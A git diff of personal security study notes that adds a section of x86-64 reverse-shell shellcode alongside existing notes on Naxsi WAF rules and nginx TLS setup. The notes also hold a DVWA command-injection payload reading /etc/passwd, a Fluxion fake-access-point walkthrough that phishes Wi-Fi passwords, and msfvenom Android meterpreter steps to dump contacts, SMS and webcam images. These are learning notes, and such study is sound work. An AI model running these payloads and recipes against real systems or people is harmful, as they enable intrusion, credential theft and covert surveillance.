@@ -1,3 +1,121 @@
+
+http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+
+#------------------------------------------------------------------------------
+# ! Shellcodes database for study cases
+#------------------------------------------------------------------------------
+# http://shell-storm.org/shellcode/
+# list of scripts
+
+#------------------------------------------------------------------------------
+# Reverse Shell shell
+#------------------------------------------------------------------------------; nc -l -p 4444 127.0.0.1
+; https://github.com/rtaylor777/nasm/blob/master/RevShell1434.nasm
+; https://www.exploit-db.com/exploits/41398/
+
+; For a detailed explanation of this shellcode see my blog post:
+; http://a41l4.blogspot.ca/2017/02/assignment-2b.html
+
+global _start
+section .text
+_start:
+; Socket
+    push 41
+    pop rax
+    push 2
+    pop rdi
+    push 1
+    pop rsi
+    cdq
+    syscall
+; Connect
+    xchg edi, eax
+    push rdx
+    mov rbx, 0xfeffff80a3eefffd ; not encoded 0x0100007f5c110002
+    not rbx
+    push rbx
+    mov al, 42
+    push rsp
+    pop rsi
+    mov dl, 16
+    syscall
+; Dup 2
+    push 3
+    pop rsi
+dup2loop:
+    mov al, 33
+    dec esi
+        syscall
+    loopnz dup2loop
+; Execve
+    ; rax and rsi are zero from the result of the last dup2 syscall and loop
+        push rax ; zero terminator for the following string that we are pushing
+
+        mov rbx, '/bin//sh'
+        push rbx
+
+        ; store /bin//sh address in RDI
+    push rsp
+    pop rdi
+
+    cdq ; zero rdx
+
+    mov al, 59
+        syscall
+
+
+#------------------------------------------------------------------------------
+# Penetration test
+#------------------------------------------------------------------------------
+# http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
+
+# INFO
+http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#OSINT
+
+# Penetration testingframework
+http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
+
+# Exploit
+https://www.exploit-db.com/
+
+
+* Network protocols, i.e. TCP/UDP
+* Linux
+* Virtual Machines
+
+* YouTube
+* SecurityTube
+* Twitter (follow people like egyp7, HD moore, dookie200ca, g0tmi1k, etc.)
+* VulnHub
+* EvilZone
+* IRC, Freenode in particular
+* Other hacker forums
+* And many more that I can't remember right now.
+
+#to learn
+* Web Applications
+* Web Services and APIs
+* Network/Routing Flaws
+* Service Misconfigurations (FTP, SSH, etc.)
+* Operating System Misconfigurations (Linux, Windows, etc.)
+* Buffer Overflows
+* XYZ Injection (Basically anything related to injecting arbitrary commands on a service level)
+* Cryptography Flaws
+* Physical Defects and Flaws
+* Malware/Spyware/Etc
+* And a lot more.
+
+
+
+
+
+
+exit
+#------------------------------------------------------------------------------
+#
+#------------------------------------------------------------------------------
+
 Wallarm -> WAF with machine learning + vulnerability scanner
 Does a hybrit approach with filtering nodes installed in customer's infrasture and strong analytics in the cloud
 
@@ -38,7 +156,7 @@ location /search {
 #
 #------------------------------------------------------------------------------
 # Naxsi goes from black users to white users
-# blacklist are negative by default in naxsi 
+# blacklist are negative by default in naxsi
 # blacklist are moustly with regular exprecion -> slower or with string
 
 MainRule "str:<" "msg open tag" "mz:Args|URL|BODY\$HEADERS_VAR:Cookie" "s:$XSS:8" "id:1302";
@@ -112,7 +230,7 @@ Nxtool templates (dynamic)
   "id" ;
 }
 
-$ python nodtool.py -c nxapi.json -x -x-s xxx.com 
+$ python nodtool.py -c nxapi.json -x -x-s xxx.com
 learning for cokkies !!!
 
 
@@ -134,7 +252,7 @@ reporting/visualisation
 
 # you can see as monitoring
 # to see the learning of attacks
-Kybernete 
+Kybernete
 
 
 #Trips, naxsi language
@@ -157,7 +275,7 @@ CheckRule "$UWA >=8" DROP;
 # www.mare-system.de/doxi
 
 
- 
+
 
 
 
@@ -165,19 +283,19 @@ CheckRule "$UWA >=8" DROP;
 
 # NGINX https://www.youtube.com/watch?v=dsTub1_4Upg
 #------------------------------------------------------------------------------
-A lot of customization, we do hosting 
+A lot of customization, we do hosting
 Web application, Classical IT
 
 
 Cipher Suites     # SSL used it
 
 
-   ECDHE     -      RSA        -  AES256-GCM     - SHA384    
+   ECDHE     -      RSA        -  AES256-GCM     - SHA384
 Key Exchange - Cerfificate Key - Trasport Cipher - Integrity
 
 
 # how to create a CSR and private key?
-# Certificate request  
+# Certificate request
 # StartSSL.com
 # Using CFSSL
 
@@ -190,7 +308,7 @@ openssl req -new -sha256 -key key.pem -out key.csr
 Recommend at least 1.0.1p  (openssl )
 
 
-nginz.conf 
+nginz.conf
 """
 ssl_certificate   multiSAN.crt;
 ssl_certificate_key multiSAN.key
@@ -203,13 +321,13 @@ server {
 
   #root html;
   #inder index.html index.htm;
- 
+
   #ssl_certificate /path/to/signed_cert_plus_intermediates;
   #ssl_certificate_key /path/to/private_key;
 
   ssl_session_timeout 5m;
   #ssl_session_timeout 1d;
-  
+
   ssl_session_cache shared:SSL:50m;    # share between nginx workers; session resumtion
 
   # High security, low compatibility
@@ -221,14 +339,14 @@ server {
 
   #ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256;
   ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384
- 
-  ssl_prefer_server_ciphers on;     # server choice, always better  
 
-  # session tickets 
+  ssl_prefer_server_ciphers on;     # server choice, always better
+
+  # session tickets
 
   # HSTS
   add_header $strict-Transport-Security max-age=15768000;   # 6 months
-   
+
   # OCSP Stampling: server pre-fetches OSCP responce -> make it faster
   # Saves a round-trip to the client
   set_stapling on;
@@ -246,7 +364,7 @@ server {
 http {
   server {
     proxy_ssl_protocols    TLSv1 TLSv1.1 TLSv1.2;
-    proxy_ssl_ciphers <ssl_ciphers>;  
+    proxy_ssl_ciphers <ssl_ciphers>;
     proxy_ssl_trusted_certificate  /etc/ssl/certs/trusted_cs_cert.crt;
 
     proxy_ssl_verify on;
@@ -257,11 +375,11 @@ http {
 
 # what you have to setup correctly
 # ssllabs.com
-# 
+#
 """
 
 # To add HSTS !!! A+ security
-HSTS  Hyperprotect strick transport security; always redirect to https, but it's dangerous if ssl is down 
+HSTS  Hyperprotect strick transport security; always redirect to https, but it's dangerous if ssl is down
 # HTTP header cached by browser
 # browser always attempts HTTPS
 # Maximum age defined in seconds
@@ -347,10 +465,10 @@ ping-c 4 192.168.0.171
 
 DvWA > Command injection > 191.168.0.171; cat /etc/passwd
 
-# wifi 
+# wifi
 #------------------------------------------------------------------------------
 https://www.youtube.com/watch?v=Pc8JCiRZ-4w
-# man in the middle 
+# man in the middle
 
 FLuxion -> Flusion is a remake of linset by vk496 with less bugs and more features. It's compatible with Kali
 
@@ -366,8 +484,8 @@ A captive portal
 Each submitted password is verified
 
 
-copy the script from Flusion git 
-# you need two wireless cards and at list one package ingestion 
+copy the script from Flusion git
+# you need two wireless cards and at list one package ingestion
 
 cd .ssh
 Host rudik
@@ -376,16 +494,16 @@ Host rudik
 
 sudo apt-get install git
 git clone https://github.com/deltaxflux/fluxion.git
-ls 
+ls
 cd fluxion
 ls
 ./Installer.sh
 # inside graphical session
 sudo apt-get install tightvncserver
-tightvncserver 
-# it starts desktop 
+tightvncserver
+# it starts desktop
 # open new terminal
-vncviewer 192.168.1.171:2    
+vncviewer 192.168.1.171:2
 # it loads desktop
 
 # inside graptical session run
@@ -398,7 +516,7 @@ vncviewer 192.168.1.171:2
     # find all wifis
     CTRL+C
    #> 6   (Run on channel 6)
-   # Select 
+   # Select
    #> 1) FakeAP - Hostapd (Recommended)     # man in the middle attack
    #  2) FakeAP - airbase-ng (Slower connection)
    #  3) WPS-SLAUGHTER - Bruteforce WPS Pin
@@ -423,7 +541,7 @@ vncviewer 192.168.1.171:2
       2) Back (Select another deauth method)
       3) Select another network
       4) Exit
-      
+
    Select your option
       1) Web interface   (1)
       2) Bruteforce
@@ -432,7 +550,7 @@ vncviewer 192.168.1.171:2
    Select Login Page (or create your own in)
      English login page (1)
 
-   
+
    > it will connect to new network with the same name
 > user enters the password and we are in
 
@@ -446,7 +564,7 @@ Path: /root/handshakes/<name>.cap
 
 
 
-   
+
 
 
 
@@ -454,9 +572,9 @@ Path: /root/handshakes/<name>.cap
 
 # GO THERE the bit security organization with Tesla, , check tutorial
 #------------------------------------------------------------------------------
-bugcrowd 
+bugcrowd
 
-# android 
+# android
 #------------------------------------------------------------------------------
 https://www.youtube.com/watch?v=hDsdpbAWrKA
 
@@ -465,7 +583,7 @@ https://www.youtube.com/watch?v=hDsdpbAWrKA
 # LHOST is my ip from ifconfig; this will send to user
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.171 LPORT=4444 R >shell.apk
 
-get the file on android 
+get the file on android
 
 msfconsole
 msf > use exploit/multi/handler
@@ -481,8 +599,8 @@ meterpreter > help
 > webcam_snap 2
 > webcam_snap 1
 > shell                # get inside shell
-> sysinfo              # 
-> dump_contacts   
+> sysinfo              #
+> dump_contacts
 > dump_sms
 > geolocate
 > exit
@@ -490,8 +608,8 @@ meterpreter > help
 
 
 service apache2 start
- 
-# nmap network mapper 
+
+# nmap network mapper
 #------------------------------------------------------------------------------
 https://n0where.net/security-auditing-tool-lynis/
 ifconfig
@@ -525,7 +643,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
 
 ametist
 
-# NGINX NASXI 
+# NGINX NASXI
 #------------------------------------------------------------------------------
 https://github.com/nbs-system/naxsi/wiki/naxsi-setup
 
@@ -558,7 +676,7 @@ ssh <user>@<hostname> 'cp ~/apache/sites/*/conf/worker.workers' > ~/tmp/apache/s
 #------------------------------------------------------------------------------
 https://portal.comproof.net/vpn/index.html
 
-# KILL Citrix 
+# KILL Citrix
 /opt/Citrix/ICAClient/wfica -icaroot /opt/Citrix/ICAClient /tmp/mozilla_kuntuzangmo0/Q2xhcmEuUmVtb3RlIERlc2t0b3A-.ica
 
 
